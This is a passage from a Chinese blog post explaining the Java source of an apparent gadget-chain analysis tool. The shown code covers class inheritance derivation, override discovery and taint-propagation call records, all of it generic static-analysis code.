&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从 inheritanceMap.dat 加载继承关系信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title function_">load</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : DataLoader.loadData(</span><br><span class="line">                Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">InheritanceMapFactory</span>())) &#123;</span><br><span class="line">            inheritanceMap.put(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InheritanceMap</span>(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>继承信息</strong>的读写格式（仅针对 <code>子类-&gt;父类集合</code>）：<code>类名 父类/超类/接口类</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">InheritanceMapFactory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt;&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.<span class="type">Handle</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; superClasses = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            superClasses.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry&lt;&gt;(clazz, superClasses);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; obj) &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> <span class="title class_">String</span>[obj.getValue().size()+<span class="number">1</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = obj.getKey().getName();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle handle : obj.getValue()) &#123;</span><br><span class="line">            fields[i++] = handle.getName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-InheritanceDeriver"><a href="#6-InheritanceDeriver" class="headerlink" title="6. InheritanceDeriver"></a>6. InheritanceDeriver</h3><p>实现<strong>继承信息</strong>和<strong>重写方法信息</strong>的收集，存储重写信息时以缩进表示重写方法，具体存储格式在 <code>GadgetChainDiscovery</code> 中给出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InheritanceDeriver</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(InheritanceDeriver.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取继承信息：子类-&gt;父类集合、父类-&gt;子类集合</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap 类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> InheritanceMap <span class="title function_">derive</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap)</span> &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Calculating inheritance for &quot;</span> + (classMap.size()) + <span class="string">&quot; classes...&quot;</span>);</span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; implicitInheritance = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历所有类</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : classMap.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (implicitInheritance.containsKey(classReference.getHandle())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Already derived implicit classes for &quot;</span> + classReference.getName());</span><br><span class="line">            &#125;</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; allParents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取 classReference 的所有父类、超类、接口类</span></span><br><span class="line">            getAllParents(classReference, classMap, allParents);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加缓存：类名-&gt;所有的父类、超类、接口类</span></span><br><span class="line">            implicitInheritance.put(classReference.getHandle(), allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InheritanceMap</span>(implicitInheritance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取目标类的所有父类、超类、接口类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classReference 目标类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       类信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allParents     父类、超类、接口类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();   <span class="comment">// 已知当前父类和接口</span></span><br><span class="line">        <span class="comment">// 把当前 classReference 类的所有父类添加到 parents</span></span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把当前 classReference 类实现的所有接口添加到 parents</span></span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">            parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从类数据集合中，遍历找出 classReference 的直接父类/接口</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123; <span class="comment">// 查找直接父类信息</span></span><br><span class="line">            <span class="type">ClassReference</span> <span class="variable">parentClassReference</span> <span class="operator">=</span> classMap.get(immediateParent);</span><br><span class="line">            <span class="keyword">if</span> (parentClassReference == <span class="literal">null</span>) &#123;</span><br><span class="line">                LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加到 allParents 父类集合中</span></span><br><span class="line">            allParents.add(parentClassReference.getHandle());</span><br><span class="line">            <span class="comment">// 递归查找，直到把 classReference 类的所有父类、超类、接口类都添加到 allParents</span></span><br><span class="line">            getAllParents(parentClassReference, classMap, allParents);  <span class="comment">// 递归查找父类的父类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取类的所有重写方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      方法信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; getAllMethodImplementations(</span><br><span class="line">            InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, MethodReference&gt; methodMap) &#123;</span><br><span class="line">        <span class="comment">// 存储类的方法，类-&gt;方法集合</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodsByClass = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历方法信息，获取类-&gt;方法集合</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            ClassReference.<span class="type">Handle</span> <span class="variable">classReference</span> <span class="operator">=</span> method.getClassReference();  <span class="comment">// 获取类</span></span><br><span class="line">            <span class="keyword">if</span> (!methodsByClass.containsKey(classReference)) &#123;  <span class="comment">// 避免重复</span></span><br><span class="line">                Set&lt;MethodReference.Handle&gt; methods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();  <span class="comment">// 存储方法</span></span><br><span class="line">                methods.add(method);</span><br><span class="line">                methodsByClass.put(classReference, methods);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                methodsByClass.get(classReference).add(method); <span class="comment">// 添加方法</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储继承关系，父类-&gt;子类集合</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 从 子类-&gt;父类集合 中取出父类</span></span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!subClassMap.containsKey(parent)) &#123; <span class="comment">// 避免重复</span></span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; subClasses = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();    <span class="comment">// 存储子类</span></span><br><span class="line">                    subClasses.add(entry.getKey());</span><br><span class="line">                    subClassMap.put(parent, subClasses);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    subClassMap.get(parent).add(entry.getKey());    <span class="comment">// 添加子类</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找重写方法</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历方法集合</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference method : methodMap.values()) &#123;</span><br><span class="line">            <span class="comment">// Static methods cannot be overriden</span></span><br><span class="line">            <span class="keyword">if</span> (method.isStatic()) &#123;    <span class="comment">// 静态方法不能被重写</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 存储重写方法</span></span><br><span class="line">            Set&lt;MethodReference.Handle&gt; overridingMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(method.getClassReference());    <span class="comment">// 方法所属类的子类集合</span></span><br><span class="line">            <span class="keyword">if</span> (subClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历子类</span></span><br><span class="line">                <span class="keyword">for</span> (ClassReference.Handle subClass : subClasses) &#123;</span><br><span class="line">                    <span class="comment">// This class extends ours; see if it has a matching method</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; subClassMethods = methodsByClass.get(subClass); <span class="comment">// 类的方法集合</span></span><br><span class="line">                    <span class="keyword">if</span> (subClassMethods != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (MethodReference.Handle subClassMethod : subClassMethods) &#123;</span><br><span class="line">                            <span class="comment">// 判断方法名称和描述符是否相等</span></span><br><span class="line">                            <span class="keyword">if</span> (subClassMethod.getName().equals(method.getName()) &amp;&amp; subClassMethod.getDesc().equals(method.getDesc())) &#123;</span><br><span class="line">                                overridingMethods.add(subClassMethod);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果存在重写方法，则保存到 methodImplMap 中</span></span><br><span class="line">            <span class="keyword">if</span> (overridingMethods.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                methodImplMap.put(method.getHandle(), overridingMethods);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-GraphCall"><a href="#7-GraphCall" class="headerlink" title="7. GraphCall"></a>7. GraphCall</h3><p>定义污点在<strong>调用关系</strong>中的传递信息，指的是被调用方法的参数受调用者方法的参数影响，使用 asm 访问者记录，涉及模拟 JVM 的一些操作，具体实现在 <code>CallGraphDiscovery</code> 类中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GraphCall</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle callerMethod;  <span class="comment">// 调用者（方法）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle targetMethod;  <span class="comment">// 被调用者（方法）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> callerArgIndex;   <span class="comment">// 调用者（方法）的参数索引</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String callerArgPath; <span class="comment">// 参数对象的哪个字段被传递</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> targetArgIndex;   <span class="comment">// 被调用者（方法）的参数索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GraphCall</span><span class="params">(MethodReference.Handle callerMethod, MethodReference.Handle targetMethod, <span class="type">int</span> callerArgIndex, String callerArgPath, <span class="type">int</span> targetArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.callerMethod = callerMethod;</span><br><span class="line">        <span class="built_in">this</span>.targetMethod = targetMethod;</span><br><span class="line">        <span class="built_in">this</span>.callerArgIndex = callerArgIndex;</span><br><span class="line">        <span class="built_in">this</span>.callerArgPath = callerArgPath;</span><br><span class="line">        <span class="built_in">this</span>.targetArgIndex = targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getCallerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getTargetMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> targetMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCallerArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCallerArgPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTargetArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;   <span class="comment">// 比较方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">GraphCall</span> <span class="variable">graphCall</span> <span class="operator">=</span> (GraphCall) o;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (callerArgIndex != graphCall.callerArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetArgIndex != graphCall.targetArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (callerMethod != <span class="literal">null</span> ? !callerMethod.equals(graphCall.callerMethod) : graphCall.callerMethod != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetMethod != <span class="literal">null</span> ? !targetMethod.equals(graphCall.targetMethod) : graphCall.targetMethod != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath != <span class="literal">null</span> ? callerArgPath.equals(graphCall.callerArgPath) : graphCall.callerArgPath == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123; <span class="comment">// 存储到键值数据格式中调用的比较方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> callerMethod != <span class="literal">null</span> ? callerMethod.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + (targetMethod != <span class="literal">null</span> ? targetMethod.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + callerArgIndex;</span><br><span class="line">        result = <span class="number">31</span> * result + (callerArgPath != <span class="literal">null</span> ? callerArgPath.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + targetArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义读写格式：<code>父类，父方法，父方法描述符，子类，被调方法，被调方法描述，父方法参数索引，父方法参数名，被调方法参数索引</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;GraphCall&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GraphCall <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">3</span>]), fields[<span class="number">4</span>], fields[<span class="number">5</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">6</span>]),</span><br><span class="line">                fields[<span class="number">7</span>],</span><br><span class="line">                Integer.parseInt(fields[<span class="number">8</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(GraphCall obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.callerMethod.getClassReference().getName(), obj.callerMethod.getName(), obj.callerMethod.getDesc(),</span><br><span class="line">                obj.targetMethod.getClassReference().getName(), obj.targetMethod.getName(), obj.targetMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.callerArgIndex),</span><br><span class="line">                obj.callerArgPath,</span><br><span class="line">                Integer.toString(obj.targetArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Source"><a href="#8-Source" class="headerlink" title="8. Source"></a>8. Source</h3><p>定义<strong>污点源信息</strong>的描述方式，由实现了抽象类 <code>SourceDiscovery</code> 的类搜索和记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Source</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle sourceMethod;  <span class="comment">// 所属方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> taintedArgIndex;                  <span class="comment">// 传递污点的参数索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Source</span><span class="params">(MethodReference.Handle sourceMethod, <span class="type">int</span> taintedArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sourceMethod = sourceMethod;</span><br><span class="line">        <span class="built_in">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getSourceMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> 